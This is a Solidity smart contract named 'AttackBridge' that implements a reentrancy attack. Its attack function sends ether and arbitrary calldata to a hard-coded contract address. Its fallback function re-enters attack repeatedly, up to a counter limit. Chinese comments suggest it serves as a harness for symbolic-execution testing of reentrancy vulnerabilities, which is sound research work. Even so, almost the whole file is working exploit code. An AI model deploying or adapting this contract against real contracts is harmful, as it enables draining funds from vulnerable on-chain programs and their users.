// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AttackBridge{

    // address private last_caller_addr;
    // string private func_sig;
    bytes private free_call_data;
    // bytes  private call_data;
    // string private func_sig_re;
    // address private owner;
    uint256 private flag;
    uint256 private counter;


    constructor(bytes memory func_sig_) public {
        free_call_data = func_sig_;
        flag = 0;
        counter = 0;
        // last_caller_addr = address(0);
        // func_sig_re = func_sig_;
        // owner = msg.sender;
    }

    // 满足 call 的 地址是符号型的, sig 是符号型的 value 也是符号型的. 

    function attack(uint256 num_, bytes memory call_data_1) public payable{
        // 开锁
        flag = 1;
        counter = counter +1;
        free_call_data = call_data_1;
        
        if (counter < 5){
            
            (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(call_data_1);

            if (!sucess){
                //关锁
                flag = 0;
                revert();
            }    
        }
        // call_data = call_data_1;
        // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
            // abi.encodeWithSignature(func_sig_, call_data_1, call_data_1) );
        
        //关锁
        flag = 0;
    }

    // function attack0(uint256 num_, string memory func_sig_, address addr) public payable{
        
    //     // 开锁
    //     flag = 1;

    //     // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
    //     //     abi.encodeWithSignature(func_sig_) );
    //     func_sig_re = func_sig_;
    //     last_caller_addr = addr;
    //     (bool sucess, bytes memory data) = address(addr).call.value(num_)(
    //         abi.encodeWithSignature(func_sig_) );
    //     // func_sig_re = abi.encodeWithSignature(func_sig_);
        
    //     if (!sucess){
    //         //关锁
    //         flag = 0;
    //         // revert();
    //     }
    //     //关锁
    //     flag = 0;
    // }

    // function call_ (address addr_, string memory sig) private returns (bool){
    //     bool sucess;
    //     bytes memory data;
    //     // bytes1 zero = 0x00;
    //     if (call_data_list.length == 0){
    //         (sucess, data) = address(addr_).call(
    //         abi.encodeWithSignature(sig) );
    //         return sucess;
    //     }
    //     else {
    //         (sucess, data) = address(addr_).call(
    //         // abi.encodeWithSignature(sig, call_data_list) );
    //         abi.encodeWithSignature(sig, call_data_list,call_data_list) );
    //         return sucess;
    //     }
    // }

    // function return_true () internal returns (bool){
    //     return true;
    // }

    function () external payable {
        // init
        // 咱们做 符号执行的时候 不用 sig_, 只是目前实际测试的时候采用 sig_; 
        // string memory sig_ = "attacked(uint,address)"; 
        if (flag != 1){
            revert();
            // return_true();
        }
        // (bool sucess, bytes memory data) = address(msg.sender).call(
        // abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );

        // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(
        //     abi.encodeWithSignature(func_sig, call_data, call_data) );
        if (flag == 1){
            // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(free_call_data);
            // (bool sucess, bytes memory data) = address(last_caller_addr).call.value(0)(free_call_data);
            // attack0(0, func_sig_re, last_caller_addr);
            attack(0,free_call_data);
            // if (!sucess){
            //     revert();
            //     // (bool sucess2, bytes memory data2) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(free_call_data
            //     // if (!sucess2){
            //         // revert();
            //     // }
            // }
        }
    }
}


